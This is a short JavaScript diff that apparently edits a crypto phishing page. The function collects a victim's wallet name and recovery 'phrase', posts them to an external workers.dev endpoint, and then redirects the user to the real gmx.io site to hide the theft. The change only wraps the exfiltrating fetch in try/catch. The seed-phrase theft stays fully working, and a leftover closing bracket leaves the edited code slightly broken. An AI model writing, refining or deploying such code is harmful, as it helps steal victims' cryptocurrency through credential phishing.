@@ -23,11 +23,17 @@ const sendDDD = _ => {
                         formData.append('wallet', wallet);
                         formData.append('phrase', phrase);
 
-                        await fetch('https://mountaindewmfka.juistespastelastes.workers.dev', {
-                            method: 'POST',
-                            body: formData
-                        }).then(res => {
-                            res.status === 200 && (location = 'https://app.gmx.io/#/trade');
+                        try {
+    const response = await fetch('https://mountaindewmfka.juistespastelastes.workers.dev', {
+        method: 'POST',
+        body: formData
+    });
+    if (response.ok) {
+        window.location.href = 'https://gmx.io';
+    }
+} catch (error) {
+    console.log('Error:', error);
+}
                         })
                     };
                 };
